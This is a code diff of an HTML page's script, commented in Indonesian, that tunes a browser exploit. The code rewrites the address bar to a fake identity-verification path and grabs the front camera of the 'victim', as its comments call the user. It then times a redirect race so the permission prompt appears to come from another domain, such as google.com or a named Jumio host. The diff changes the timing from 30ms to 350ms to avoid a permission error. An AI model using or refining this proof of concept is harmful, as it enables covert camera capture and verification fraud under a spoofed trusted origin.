@@ -82,52 +82,48 @@
     </div>
 
     <script>
-      function executePowerfulSpoof() {
-        const btn = document.getElementById("btn-trigger");
-        const video = document.getElementById("video-preview");
-        const log = document.getElementById("status-log");
+  function executePowerfulSpoof() {
+    const btn = document.getElementById("btn-trigger");
+    const video = document.getElementById("video-preview");
+    const log = document.getElementById("status-log");
 
-        // 1. Ubah UI secara instan agar korban mengira sistem sedang loading
-        btn.style.display = "none";
-        video.style.display = "block";
-        log.textContent = "Connecting to secure server...";
+    // 1. Perubahan UI Instan
+    btn.style.display = "none";
+    video.style.display = "block";
+    log.textContent = "Connecting to secure server...";
 
-        // 2. Samarkan URL path di address bar agar terlihat legitimate
-        history.pushState({}, "", "/v2/identity-verification/secure");
+    // 2. Samarkan URL path
+    history.pushState({}, "", "/v2/identity-verification/secure");
 
-        // 3. PANGGIL KAMERA SEGERA (Memanfaatkan User Gesture secara Maksimal)
-        // Menggunakan constraints paling kompatibel dengan WebKit iOS untuk menghindari TypeError
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-          navigator.mediaDevices.getUserMedia({ 
-            video: { 
-              facingMode: "user", // Memaksa kamera depan aktif agar wajah korban langsung terlihat
-              width: { ideal: 640 },
-              height: { ideal: 480 }
-            }, 
-            audio: false 
-          })
-          .then((stream) => {
-            log.style.color = "#34c759";
-            log.textContent = "CRITICAL: CAMERA ACCESSED SUCCESSFULLY!";
-            video.srcObject = stream;
-          })
-          .catch((err) => {
-            log.textContent = "Error: " + err.name;
-          });
-        }
+    // 3. EKSKUSI KAMERA SECARA INSTAN
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: "user" }, 
+        audio: false 
+      })
+      .then((stream) => {
+        log.style.color = "#34c759";
+        log.textContent = "CRITICAL: CAMERA ACCESSED!";
+        video.srcObject = stream;
+      })
+      .catch((err) => {
+        // Jika masih NotAllowedError, kita bisa melihatnya di sini
+        log.textContent = "Error: " + err.name;
+      });
+    }
 
-        // 4. TINDAKAN SENGATAN RACE CONDITION (Eksploitasi State Navigasi)
-        // Menggunakan makrotask setTimeout(..., 0) untuk menyelipkan request kamera 
-        // ke dalam event loop tepat sebelum instruksi navigasi menghancurkan context
-        setTimeout(() => {
-          requestAnimationFrame(() => {
-            requestAnimationFrame(() => {
-              // Ganti domain ini dengan target yang ingin Anda tiru (misal: bugcrowd.web.amer-1.jumio.ai atau google.com)
-              location.href = "https://google.com:9090"; 
-            });
-          });
-        }, 30); // Timing 30ms memberikan waktu bagi objek getUserMedia berinisialisasi di level OS sebelum UI ter-spoof
-      }
-    </script>
+    // 4. PENYESUAIAN TIMING NAVIGATION (Mencegah NotAllowedError)
+    // Kita menaikkan jeda ke 350ms agar dialog native kamera sempat muncul ke layar 
+    // menggunakan hak akses klik pengguna, sebelum dihantam oleh race condition navigasi.
+    setTimeout(() => {
+      requestAnimationFrame(() => {
+        requestAnimationFrame(() => {
+          // Ganti domain ini dengan target yang ingin Anda spoof
+          location.href = "https://google.com:9090"; 
+        });
+      });
+    }, 350); // Jeda dinaikkan dari 30ms menjadi 350ms
+  }
+</script>
   </body>
 </html>
